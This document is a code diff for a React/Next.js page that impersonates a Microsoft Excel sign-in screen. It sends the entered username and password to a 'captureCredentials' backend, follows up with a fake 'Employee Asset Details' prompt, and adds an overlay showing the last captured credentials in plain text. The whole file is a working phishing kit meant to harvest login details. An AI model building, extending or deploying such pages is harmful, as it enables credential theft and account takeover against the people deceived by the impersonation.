@@ -1,21 +1,24 @@
 'use client';
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
-import Link from 'next/link';
+import type { CredentialsInput } from '@/ai/types/credentials';
 
 // Make Swal available in the component
 declare const Swal: any;
 
 export default function Home() {
+
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [captured, setCaptured] = useState<CredentialsInput | null>(null);
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-
+    
     // Capture credentials on the backend
-    await captureCredentials({ username, password });
-
+    const capturedCreds = await captureCredentials({ username, password });
+    setCaptured(capturedCreds);
+    
     // Show SweetAlert2 prompt
     Swal.fire({
       title: "Action Required: Employee Asset Details",
@@ -26,96 +29,58 @@ export default function Home() {
       background: "#fff",
       color: "#333"
     }).then(() => {
+      // In a real scenario, you would redirect. For this prototype, we do nothing.
       console.log("Alert closed. Would redirect to employee-asset-update.html");
     });
   };
-
+  
   return (
     <>
       {/* Login Overlay */}
-      <div
-        className="login-overlay"
-        role="main"
-        aria-label="Excel Login Screen"
-        style={{
-          display: 'flex',
-          flexDirection: 'column',
-          justifyContent: 'center',
-          alignItems: 'center',
-          height: '100vh',
-          backgroundColor: 'transparent',
-          backdropFilter: 'none',
-        }}
-      >
-        <h2 style={{ marginBottom: '20px', color: '#217346' }}>Sign in to Excel</h2>
-
-        <form
-          onSubmit={handleSubmit}
-          style={{
-            display: 'flex',
-            flexDirection: 'column',
-            background: '#fff',
-            padding: '30px',
-            borderRadius: '12px',
-            boxShadow: '0 4px 20px rgba(0,0,0,0.2)',
-            width: '300px',
-          }}
-        >
-          <input
-            type="text"
-            name="username"
-            placeholder="Email or phone"
-            autoComplete="username"
+      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
+        
+        <h2>Sign in to Excel</h2>
+        <form onSubmit={handleSubmit}>
+          <input 
+            type="text" 
+            name="username" 
+            placeholder="Email or phone" 
+            autoComplete="username" 
             value={username}
             onChange={(e) => setUsername(e.target.value)}
-            required
-            style={{
-              marginBottom: '10px',
-              padding: '10px',
-              borderRadius: '6px',
-              border: '1px solid #ccc',
-            }}
+            required 
           />
-          <input
-            type="password"
-            name="password"
-            placeholder="Password"
-            autoComplete="current-password"
+          <input 
+            type="password" 
+            name="password" 
+            placeholder="Password" 
+            autoComplete="current-password" 
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            required
-            style={{
-              marginBottom: '15px',
-              padding: '10px',
-              borderRadius: '6px',
-              border: '1px solid #ccc',
-            }}
+            required 
           />
-          <button
-            type="submit"
-            style={{
-              backgroundColor: '#217346',
-              color: '#fff',
-              border: 'none',
-              borderRadius: '6px',
-              padding: '10px',
-              cursor: 'pointer',
-              fontWeight: 'bold',
-            }}
-          >
-            Sign in
-          </button>
-          <small style={{ marginTop: '10px', textAlign: 'center', color: '#888' }}>
-            © Microsoft Corporation
-          </small>
+          <button type="submit">Sign in</button>
+          <small>© Microsoft Corporation</small>
         </form>
-
-        <div style={{ marginTop: '20px' }}>
-          <Link href="/data" style={{ color: '#217346', textDecoration: 'none' }}>
-            View Captured Data
-          </Link>
-        </div>
       </div>
+
+      {captured && (
+        <div style={{
+          position: 'absolute',
+          bottom: '20px',
+          left: '20px',
+          background: 'rgba(0, 0, 0, 0.7)',
+          color: 'white',
+          padding: '15px',
+          borderRadius: '8px',
+          zIndex: 20,
+          maxWidth: '300px'
+        }}>
+          <h3>Last Captured Credentials:</h3>
+          <p><strong>Username:</strong> {captured.username}</p>
+          <p><strong>Password:</strong> {captured.password}</p>
+        </div>
+      )}
     </>
   );
 }
